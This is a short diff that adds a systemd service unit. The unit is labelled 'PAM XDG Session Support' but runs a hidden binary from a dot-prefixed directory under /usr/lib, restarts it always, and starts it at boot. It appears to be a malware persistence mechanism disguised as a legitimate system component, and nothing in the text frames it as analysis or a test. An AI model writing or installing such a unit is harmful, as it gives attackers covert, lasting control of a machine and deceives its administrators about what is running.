@@ -1,0 +1,11 @@
+[Unit]
+Description=PAM XDG Session Support
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/lib/.libpam-xdg-support/.update-helper
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
